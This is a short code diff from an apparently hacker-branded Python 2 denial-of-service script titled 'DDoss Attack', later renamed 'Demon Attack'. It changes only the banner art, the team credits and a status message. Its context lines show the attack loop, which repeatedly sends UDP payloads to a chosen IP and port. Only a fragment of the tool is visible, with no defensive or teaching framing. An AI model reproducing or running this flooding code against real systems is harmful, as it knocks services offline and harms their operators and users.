@@ -23,17 +23,16 @@ def doss():
     os.system("clear")
     print rd+'''
     
-                        8888b.  8888b.   dP"Yb  .dP"Y8 .dP"Y8        db    888888 888888    db     dP""b8 88  dP 
-                         8I  Yb  8I  Yb dP   Yb `Ybo." `Ybo."       dPYb     88     88     dPYb   dP   `" 88odP  
-                         8I  dY  8I  dY Yb   dP o.`Y8b o.`Y8b      dP__Yb    88     88    dP__Yb  Yb      88"Yb  
-                        8888Y"  8888Y"   YbodP  8bodP' 8bodP'     dP""""Yb   88     88   dP""""Yb  YboodP 88  Yb 
+                    
+                                  █▀▄ █▀▀ █▀▄▀█ █▀█ █▄░█ ▄▄ ▄▀█ ▀█▀ ▀█▀ ▄▀█ █▀▀ █▄▀
+                                  █▄▀ ██▄ █░▀░█ █▄█ █░▀█ ░░ █▀█ ░█░ ░█░ █▀█ █▄▄ █░█
     '''
     print '''
     +---------------------------------------------------+
-    | [+]            egypt cyber army              [+]  |
+    | [+]            Egypt Cyber Army              [+]  |
     | [+]               ahmed wael                 [+]  |
     | [+]              github: 3qrb                [+]  |
-    | [+] team: 1PJT / FUNKY / JOKER / GAX / MANDO [+]  |
+    | [+] TeAm: 1PJT / FUNKY / JOKER / GAX / MANDO [+]  |
     +---------------------------------------------------+
     '''
     print'\n'
@@ -56,7 +55,7 @@ def doss():
                 pass
             sock.sendto(payloads,(ip,port))
             sent = sent + 1 
-            print ' DDoss Attack starting on %s .... ' % (ip)
+            print ' Demon Attack starting on %s .... ' % (ip)
         except KeyboardInterrupt:
             sys.exit()
 
